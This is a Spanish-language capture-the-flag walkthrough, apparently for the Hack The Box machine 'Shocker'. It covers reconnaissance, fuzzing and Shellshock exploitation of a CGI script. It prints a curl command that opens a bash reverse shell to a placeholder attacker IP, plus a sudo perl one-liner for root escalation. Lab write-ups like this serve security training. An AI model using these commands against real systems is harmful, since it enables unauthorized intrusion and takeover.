---
layout: post
title: "HTB: SHOCKER"
date: 2024-02-02
categories: [HTB]
tags: [htb, linux, easy, shellshock, web]
difficulty: Easy
excerpt: "Walkthrough de HTB Shocker: explotación de la vulnerabilidad Shellshock en CGI."
---


Descripción:



        Shocker, aunque bastante simple en general, demuestra la gravedad del famoso exploit Shellshock, que afectó a millones de servidores públicos.



Recolección de información:



        Comencemos con el mapeo del sitio a vulnerar, tampoco es que tenga muchos puertos arriba solamente el 80 (HTTP) y 2222 (SSH), aunque sólo basta un puerto para j****** la vida.







        Visitemos la dirección a ver qué encontramos. Más simple no puede ser la página, veamos si existe código oculto....tampoco 











        Pues de momento vamos pelados de información....



Análisis de vulnerabilidades:



        Comencemos con la versión de Apache que se trata de la 2.4.18.







Nmap nos arroja información sobre un posible ataque DoS, pero tumbar el servidor es lo ÚLTIMO que queremos, es más...no queremos. 







Continuaremos lanzando unos scripts más con Nmap a ver que sacamos. Modificando un poco el script anterior sacamos un listado de las vulnerabilidades del servicio Apache. Veremos si esta información nos es válida un poco más adelante. 











        Vemos que el servicio SSH está configurado.











         Vamos a intentar un logeo anónimo.







        Tampoco hemos tenido suerte.







        Toca fuzzear un ratito. Comenzamos con dirb y nos devuelve un directorio /cgi-bin/.







        Probemos con gobuster, mismo resultado.....







        En este punto nos encontramos el problema de que los fuzzers y scramblers \"dirb, dirbuster y gobuster\" no encontraban nada a parte del directorio anterior, pero fue en este caso ffuzz con el que descubrimos un archivo llamado user.sh .







Análisis de vulnerabilidades:



   Ponemos el path encontrado en nuestro buscador y vemos que nos da una idea del siguiente paso.







        Vamos a comprobar que la máquina es vulnerable al ataque Shellshock. Bien!!!!







        Repetimos la acción de verificación esta vez desde consola, puesto que será nuestro vector principal de ataque.







        Con las comprobaciones realizadas llegó el momento de explotar la vulnerabilidad.



Explotación:



 Introducimos el script y obtenemos la shell reversa. 



curl -A \"() { :;}; /bin/bash -i &gt; /dev/tcp/&lt;IP_ATACANTE&gt;/&lt;PUERTO&gt; 0&lt;&amp;1 2&gt;&amp;1\" http://&lt;IP_VICTIMA&gt;/cgi-bin/user.sh







        Con nuestra shell podemos obtener la flag de usuario.







Escalada de privilegios:



        Vamos a comprobar si el usuario tiene permiso de ejecución sobre algún directorio, en nuestro caso se trata de poder ejecutar el binario /usr/bin/perl .







Introducimos el siguiente script sudo /usr/bin/perl -e 'exec \"/bin/bash\";' sudo /usr/bin/perl -e 'exec \"/bin/bash\";'







        Por último, solo queda localizar la flag de root







Happy Hacking!!



Referencias:



https://vulmon.com/searchpage?q=apache+http+server+2.4.18



https://github.com/j031t/POC/blob/master/CVE-2017-7679.pl



https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi



https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html



https://explainshell.com/



https://unix.stackexchange.com/questions/263277/which-of-usr-bin-perl-or-usr-local-bin-perl-should-be-used



https://fieldraccoon.github.io/misc%20posts%20not%20released%20yet/priv-esc-pre-writeup/
','SHOCKER','